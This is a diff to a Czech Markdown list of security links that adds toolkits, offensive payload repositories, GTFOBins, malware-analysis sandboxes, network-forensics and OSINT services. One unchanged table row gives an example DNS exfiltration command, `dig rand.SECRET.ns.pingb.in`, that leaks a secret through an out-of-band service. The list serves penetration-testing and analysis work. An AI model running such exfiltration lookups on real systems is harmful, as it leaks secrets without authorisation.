@@ -21,14 +21,22 @@ Kromě odkazů sem budu přidávat i vlastní poznámky, ale to nejspíš spíš
 
 ## Toolkit
 
-* Kali Linux, ParrotOS Security
-* [kali tools](https://tools.kali.org/tools-listing)
+* [Kali Linux](https://www.kali.org/), [ParrotOS Security](https://www.parrotsec.org/)
+* [Kali Tools](https://tools.kali.org/tools-listing)
+* [CyberChef](https://gchq.github.io/CyberChef)
+
+## GitHub goodies
+
+* [SecLists](https://github.com/danielmiessler/SecLists)
+* [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
+* [PenetrationTesting](https://github.com/wtsxDev/Penetration-Testing)
 
 ## Cheatsheets, návody, knihy
 
 * [HackTricks](https://book.hacktricks.xyz/)
 * [HackSplaining](https://www.hacksplaining.com/)
 * [Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/)
+* [GTFOBins](https://gtfobins.github.io/)
 
 ## Videa, konference, YouTube
 
@@ -95,10 +103,21 @@ Kromě odkazů sem budu přidávat i vlastní poznámky, ale to nejspíš spíš
 
 ## Malware analysis
 
-| název                                    | popis                           |
-| ---------------------------------------- | ------------------------------- |
-| [VirusTotal](https://www.virustotal.com) | Analýza malwaru, hashe nebo URL |
-| [AnyRun](https://app.any.run/)           | Interaktivní analýza malwaru    |
+| název                                    | popis                                     |
+| ---------------------------------------- | ----------------------------------------- |
+| [VirusTotal](https://www.virustotal.com) | Analýza malwaru, hashe, URL, pcapu        |
+| [AnyRun](https://app.any.run/)           | Interaktivní analýza malwaru              |
+| [Triage](https://tria.ge/)               | Hybridní analýza malwaru                  |
+| [VMRay](https://www.vmray.com)           | dynamická analýza malwaru, placená služba |
+| [Hybrid Analysis](https://hybrid-analysis.com/) | dynamická analýza malwaru          |
+
+## Network Forensics
+
+| název                                    | popis                                    |
+| ---------------------------------------- | ---------------------------------------- |
+| [malware-traffic-analysis.net](https://www.malware-traffic-analysis.net) | IOCs, síťové záchyty, apod. |
+| [PacketTotal](https://packettotal.com/)  | pcap analýza, docela pomalé GUI          |
+| [A-Packets](https://apackets.com/)       | pcap analýza, graf sítě, export HTTP     |
 
 ## Temporary domény, url, emaily, OOB servery
 
@@ -108,3 +127,16 @@ Kromě odkazů sem budu přidávat i vlastní poznámky, ale to nejspíš spíš
 | [pingb.in](http://pingb.in)             | data exiltration pomocí DNS lookup: `dig rand.SECRET.ns.pingb.in` |
 | [RequestBin.net](http://requestbin.net) | veřejné URL, ukazuje HTTP hlavičky, POST parametry, GET parametry |
 
+## OSINT - Open-source intelligence
+
+| název                                               | popis              |
+| --------------------------------------------------- | ------------------ |
+| [passivedns](https://passivedns.mnemonic.no/)       | Passive DNS        |
+| [macvendorlookup](https://www.macvendorlookup.com/) | MAC Lookup         | 
+| [macvendors](https://macvendors.com/)               | MAC Lookup         |
+| [NERD CESNET](https://nerd.cesnet.cz/nerd/ips/)     | reputační databáze |
+| [AbuseIPDB](https://www.abuseipdb.com)              | reputační databáze |
+
+## Blogy
+
+* [CRYPTSUS](https://cryptsus.com/blog/)
